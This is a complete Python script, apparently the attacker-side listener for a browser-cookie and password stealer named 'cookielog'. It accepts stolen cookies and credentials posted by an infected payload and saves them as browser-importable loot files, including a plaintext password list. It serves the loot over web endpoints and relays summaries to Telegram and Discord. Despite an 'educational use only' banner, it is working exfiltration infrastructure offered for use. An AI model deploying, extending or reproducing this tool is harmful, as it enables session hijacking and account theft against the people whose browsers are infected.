#!/usr/bin/env python3
"""listen.py — HTTP server that receives cookies exfiltrated by the payload.
Run on the attacker side:  python listen.py [port] [options]

  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING

  This is offensive security tooling. Only use on systems you own or are
  explicitly authorized to test. Unauthorized use is illegal.

The payload (when infected with the C2 URL) makes an HTTP POST with JSON in the
Cookie-Editor format (directly importable in the browser via the Cookie-Editor extension).

Output:
  cookies_recv.json  — cumulative collection (dedup)
  cookies_recv.txt   — Netscape format (importable in curl/wget)
  stdout             — per-domain summary

Relay options (re-send received cookies to a second channel):
  --telegram <bot_token>:<chat_id>   Forward summary to Telegram Bot API
  --discord <webhook_url>            Forward summary to Discord webhook
  --email <addr>                     (future) Forward via email
"""
import json, os, sys, time, socket, socketserver, urllib.request, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

HERE   = os.path.dirname(os.path.abspath(__file__))
LOOT   = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)

# Output files — separated by type:
#   all_cookies.json   — actual browser cookies only (no passwords)
#   all_cookies.txt    — Netscape format of the above
#   passwords.json     — extracted passwords with _username field
#   passwords.txt      — readable text: domain | username | password
#   session_cookies.json  — session-only cookies (expirationDate == 0, no passwords)
#   session_cookies.txt   — Netscape format of the above
JSONF       = os.path.join(LOOT, "all_cookies.json")
TXTF        = os.path.join(LOOT, "all_cookies.txt")
PWD_JSONF   = os.path.join(LOOT, "passwords.json")
PWD_TXTF    = os.path.join(LOOT, "passwords.txt")
SESS_JSONF  = os.path.join(LOOT, "session_cookies.json")
SESS_TXTF   = os.path.join(LOOT, "session_cookies.txt")

# Parse args: port, --telegram token:chat, --discord webhook
PORT = 8080
TELEGRAM = None  # "bot_token:chat_id"
DISCORD = None  # webhook URL

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a == "--telegram" and i + 1 < len(args):
        TELEGRAM = args[i + 1]; i += 2
    elif a == "--discord" and i + 1 < len(args):
        DISCORD = args[i + 1]; i += 2
    elif not a.startswith("--"):
        PORT = int(a); i += 1
    else:
        i += 1


class HTTPServerV4(HTTPServer):
    """Force IPv4 — HTTPServer default may resolve 0.0.0.0 to IPv6 on Windows."""
    address_family = socket.AF_INET

    def server_bind(self):
        """Override to skip socket.getfqdn() — it does a reverse DNS lookup on the
        bind address (0.0.0.0) which takes 4+ seconds on Windows, delaying listen()
        and causing the payload's HTTP connect to fail with WSAECONNREFUSED (10061)."""
        # TCPServer.server_bind does: setsockopt + bind + getsockname (no DNS)
        socketserver.TCPServer.server_bind(self)
        host, port = self.server_address[:2]
        self.server_name = socket.gethostname()  # local, no network lookup
        self.server_port = port


def load_existing():
    if os.path.exists(JSONF):
        try:
            with open(JSONF, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return []


def merge(old, new):
    seen, out = {}, list(old)
    for i, c in enumerate(out):
        k = (c.get("domain"), c.get("name"), c.get("path"))
        seen[k] = i
    for c in new:
        k = (c.get("domain"), c.get("name"), c.get("path"))
        if k in seen:
            out[seen[k]] = c
        else:
            seen[k] = len(out)
            out.append(c)
    return out


# ------------------------------------------------------------------ relay channels

def relay_telegram(cookies):
    """Forward a summary of received cookies to Telegram Bot API."""
    if not TELEGRAM:
        return
    try:
        # Parse "bot_token:chat_id"
        parts = TELEGRAM.rsplit(":", 1)
        if len(parts) != 2:
            print("[-] telegram: invalid format, expected bot_token:chat_id")
            return
        bot_token, chat_id = parts
        # Build summary
        domains = {}
        for c in cookies:
            d = c.get("domain", "?")
            domains[d] = domains.get(d, 0) + 1
        top = sorted(domains.items(), key=lambda kv: -kv[1])[:15]
        msg = "🍪 cookielog: %d cookies received\n\nTop domains:\n" % len(cookies)
        for d, n in top:
            msg += "  %4d  %s\n" % (n, d)
        msg += "\nFull JSON: loot/cookies.json"

        url = "https://api.telegram.org/bot%s/sendMessage" % bot_token
        data = urllib.parse.urlencode({
            "chat_id": chat_id,
            "text": msg,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=10)
        print("[+] telegram: summary sent (%d cookies)" % len(cookies))
    except Exception as ex:
        print("[-] telegram relay failed: %s" % ex)


def relay_discord(cookies):
    """Forward a summary of received cookies to a Discord webhook."""
    if not DISCORD:
        return
    try:
        domains = {}
        for c in cookies:
            d = c.get("domain", "?")
            domains[d] = domains.get(d, 0) + 1
        top = sorted(domains.items(), key=lambda kv: -kv[1])[:15]
        desc = "cookielog: **%d cookies** received\n\nTop domains:\n" % len(cookies)
        for d, n in top:
            desc += "`%4d`  %s\n" % (n, d)

        payload = json.dumps({"content": desc[:1900]}).encode()  # Discord 2000 char limit
        req = urllib.request.Request(DISCORD, data=payload,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
        print("[+] discord: summary sent (%d cookies)" % len(cookies))
    except Exception as ex:
        print("[-] discord relay failed: %s" % ex)


def write_json(rows):
    with open(JSONF, "w", encoding="utf-8") as f:
        json.dump(rows, f, ensure_ascii=False, indent=1)


def write_txt(rows):
    lines = ["# Netscape HTTP Cookie File"]
    for c in rows:
        d = c.get("domain", "")
        if not d.startswith("."):
            d = "." + d
        exp = int(c.get("expirationDate") or 0)
        lines.append("\t".join([
            d, "TRUE", c.get("path") or "/",
            "TRUE" if c.get("secure") else "FALSE",
            str(exp), c.get("name", ""), c.get("value") or ""
        ]))
    with open(TXTF, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


def filter_session(rows):
    """Return only real session cookies (expirationDate == 0, excluding passwords)."""
    return [c for c in rows
            if not int(c.get("expirationDate") or 0)
            and c.get("name") != "password"]

def filter_passwords(rows):
    """Return only password entries (name == 'password')."""
    return [c for c in rows if c.get("name") == "password"]

def filter_cookies(rows):
    """Return only actual cookies (name != 'password')."""
    return [c for c in rows if c.get("name") != "password"]


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve cookie files: /all (json), /passwords (json), /session (json), / (summary)"""
        if self.path == "/session":
            rows = load_existing()
            sess = filter_session(filter_cookies(rows))
            data = json.dumps(sess, ensure_ascii=False, indent=1).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        elif self.path == "/passwords":
            rows = load_existing()
            pwds = filter_passwords(rows)
            data = json.dumps(pwds, ensure_ascii=False, indent=1).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        elif self.path == "/all" or self.path == "/cookies":
            rows = load_existing()
            data = json.dumps(rows, ensure_ascii=False, indent=1).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            # Summary page
            rows = load_existing()
            all_cookies = filter_cookies(rows)
            passwords = filter_passwords(rows)
            sess = filter_session(all_cookies)
            domains = {}
            for c in all_cookies:
                d = c.get("domain", "?")
                domains[d] = domains.get(d, 0) + 1
            top = sorted(domains.items(), key=lambda kv: -kv[1])[:20]
            html = "<html><body style='font-family:monospace;background:#1a1a1a;color:#d4d4d4'>"
            html += "<h2 style='color:#4a9eff'>cookielog -- listener</h2>"
            html += "<p>Cookies: <b>%d</b> (%d session) | Passwords: <b>%d</b></p>" % (
                len(all_cookies), len(sess), len(passwords))
            html += "<p>Endpoints: <a href='/all' style='color:#4a9eff'>/all</a> | "
            html += "<a href='/passwords' style='color:#4a9eff'>/passwords</a> | "
            html += "<a href='/session' style='color:#4a9eff'>/session</a></p>"
            html += "<table><tr><th>Count</th><th>Domain</th></tr>"
            for d, n in top:
                html += "<tr><td>%d</td><td>%s</td></tr>" % (n, d)
            html += "</table></body></html>"
            data = html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b"[]"
        try:
            cookies = json.loads(body.decode("utf-8", "replace"))
        except Exception as ex:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"bad json")
            print("[-] invalid JSON (%d bytes): %s" % (length, ex))
            return

        if not isinstance(cookies, list):
            cookies = [cookies]

        # merge with existing collection
        old = load_existing()
        alls = merge(old, cookies)

        # Split into categories
        all_cookies = filter_cookies(alls)
        passwords   = filter_passwords(alls)
        sess_all    = filter_session(all_cookies)

        # Write all cookies (no passwords)
        write_json(all_cookies)
        write_txt(all_cookies)

        # Write passwords separately
        with open(PWD_JSONF, "w", encoding="utf-8") as f:
            json.dump(passwords, f, ensure_ascii=False, indent=1)
        pwd_lines = ["# cookielog — extracted passwords"]
        for c in passwords:
            user = c.get("_username") or ""
            pwd_lines.append("%s\t%s\t%s" % (c.get("domain", ""), user, c.get("value") or ""))
        with open(PWD_TXTF, "w", encoding="utf-8") as f:
            f.write("\n".join(pwd_lines) + "\n")

        # Write session-only cookies (no passwords)
        with open(SESS_JSONF, "w", encoding="utf-8") as f:
            json.dump(sess_all, f, ensure_ascii=False, indent=1)
        sess_lines = ["# Netscape HTTP Cookie File (session only)"]
        for c in sess_all:
            d = c.get("domain", "")
            if not d.startswith("."):
                d = "." + d
            sess_lines.append("\t".join([
                d, "TRUE", c.get("path") or "/",
                "TRUE" if c.get("secure") else "FALSE",
                "0", c.get("name", ""), c.get("value") or ""
            ]))
        with open(SESS_TXTF, "w", encoding="utf-8") as f:
            f.write("\n".join(sess_lines) + "\n")

        # summary
        top = {}
        new_pwds = 0
        for c in cookies:
            d = c.get("domain", "?")
            top[d] = top.get(d, 0) + 1
            if c.get("name") == "password":
                new_pwds += 1

        print("\n[+] %d entries received (%d passwords) | total: %d cookies, %d passwords, %d session" % (
            len(cookies), new_pwds, len(all_cookies), len(passwords), len(sess_all)))
        print("    -> %s (%d bytes, %d cookies)" % (JSONF, os.path.getsize(JSONF), len(all_cookies)))
        print("    -> %s (%d passwords)" % (PWD_JSONF, len(passwords)))
        print("    -> %s (%d session cookies)" % (SESS_JSONF, len(sess_all)))
        for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
            print("      %5d  %s" % (n, d))

        # relay to Telegram / Discord (if configured)
        relay_telegram(cookies)
        relay_discord(cookies)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass  # silent (we use our own prints above)


def main():
    print("[listen] exfiltration server on port %d (Ctrl+C to stop)" % PORT)
    print("[listen] cookies:  %s + %s" % (JSONF, TXTF))
    print("[listen] passwords: %s + %s" % (PWD_JSONF, PWD_TXTF))
    print("[listen] session:   %s + %s" % (SESS_JSONF, SESS_TXTF))
    print("[listen] web UI: http://localhost:%d/  (endpoints: /all /passwords /session)" % PORT)
    print("[listen] format: Cookie-Editor JSON (browser-importable)")
    if TELEGRAM:
        print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
    if DISCORD:
        print("[listen] relay: Discord -> %s" % DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30])
    server = HTTPServerV4(("0.0.0.0", PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[listen] stopped")
        server.server_close()


if __name__ == "__main__":
    main()
